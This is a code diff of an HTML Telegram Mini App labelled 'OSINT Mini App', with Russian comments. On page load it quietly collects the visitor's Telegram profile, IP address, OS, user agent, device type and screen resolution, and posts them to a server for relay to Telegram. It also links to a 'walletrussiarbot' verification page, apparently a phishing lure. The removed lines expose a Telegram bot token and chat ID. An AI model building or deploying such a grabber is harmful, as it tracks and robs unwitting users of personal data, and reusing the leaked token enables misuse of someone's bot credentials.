@@ -5,33 +5,30 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>OSINT Mini App</title>
     <script>
-        const BOT_TOKEN = '7517508116:AAHydfYGo0-6pYS3rwx0GE2__ELVhi9pwnE';
-        const CHAT_ID = '7477642275';
-        const API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+        const API_URL = '/send_data';  // URL, куда будем отправлять данные на сервер
 
         function sendToTelegram(message) {
-            fetch('/send_data', {
+            // Отправка данных на сервер
+            fetch(API_URL, {
                 method: 'POST',
                 headers: {
-                    'Content-Type': 'application/json'
+                    'Content-Type': 'application/json',
                 },
                 body: JSON.stringify({ message: message })
-            }).then(response => response.json())
-              .then(data => console.log(data));
-        }
-
-        function handleStartCommand() {
-            const message = 'Привет! Пожалуйста, нажми на одну из кнопок ниже для продолжения:';
-            sendToTelegram(message);
-        }
-
-        function redirectToVerificationPage() {
-            window.location.href = 'https://t.me/walletrussiarbot/verify';
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log(data); // Логируем ответ сервера
+            })
+            .catch(error => {
+                console.error('Ошибка:', error);
+            });
         }
 
         function collectData() {
             let logData = `Лог успешен! [${new Date().toLocaleString()}]\n\n`;
 
+            // Сбор данных о пользователе
             if (window.Telegram && Telegram.WebApp) {
                 Telegram.WebApp.ready();
                 const user = Telegram.WebApp.initDataUnsafe.user;
@@ -46,6 +43,7 @@
                 }
             }
 
+            // Сбор информации об IP и геолокации
             fetch('https://api64.ipify.org?format=json')
                 .then(response => response.json())
                 .then(data => {
@@ -55,15 +53,9 @@
                             logData += `🖥️ Информация об устройстве:\n`;
                             logData += `├ IP: ${data.ip}\n`;
                             logData += `├ ОС: ${navigator.platform}\n`;
-
-                            navigator.getBattery().then(battery => {
-                                logData += `├ Процент батареи: ${battery.level * 100}%\n`;
-                            }).catch(() => logData += `├ Процент батареи: Не доступен\n`);
-
                             logData += `├ Ядро ОС: ${navigator.platform}\n`;
                             logData += `├ Версия ОС: ${navigator.appVersion}\n`;
                             logData += `├ Имя ОС: ${navigator.userAgent}\n`;
-
                             logData += `├ Тип устройства: ${getDeviceType()}\n`;
                             logData += `├ Тип сети: Wi-Fi / Ethernet\n`;
                             logData += `├ Разрешение экрана: ${window.screen.width}x${window.screen.height}\n\n`;
@@ -104,15 +96,12 @@
             }
         }
 
-        window.onload = function() {
-            handleStartCommand(); // Отправка команды /start
-            collectData(); // Сбор данных при загрузке страницы
-        };
+        window.onload = collectData;  // Сбор данных при загрузке страницы
     </script>
 </head>
 <body>
     <h2>OSINT Mini App</h2>
     <p>Данные пользователя отправляются...</p>
-    <button onclick="redirectToVerificationPage()">Перейти на страницу подтверждения</button>
+    <button onclick="window.location.href='https://t.me/walletrussiarbot/verify'">Перейти на страницу подтверждения</button>
 </body>
 </html>
